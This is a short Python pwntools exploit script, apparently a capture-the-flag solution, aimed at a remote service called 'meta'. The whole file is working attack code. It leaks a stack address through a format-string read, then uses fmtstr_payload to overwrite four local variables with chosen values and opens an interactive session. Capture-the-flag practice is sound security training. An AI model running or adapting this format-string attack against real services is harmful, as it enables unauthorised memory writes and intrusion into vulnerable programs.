from pwn import *

context.clear(arch='i386')

#p = process("./meta")
p = remote("159.203.38.169", 5685)
print p.recvuntil("How many times have you seen the meta?\n")
p.sendline("%38$x")
print p.recvuntil("Your answer was: \n")
leaked_stack = int(p.recvline()[:-1],16)
v4 = leaked_stack - 216
v9 = v4 + 528
v8 = v4 + 524
v7 = v4 + 520

payload = fmtstr_payload(6, {v9: 1948}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v8: 2017}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v7: 0xffff}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v4: 0x1}, write_size='short')
p.sendline(payload)
p.recv()

log.info("leaked stack addr : " + hex(leaked_stack))
log.info("v4 addr : "+ hex(v4))
log.info("v9 addr : "+ hex(v9))
log.info("v8 addr : "+ hex(v8))
log.info("v7 addr : "+ hex(v7))
p.interactive()
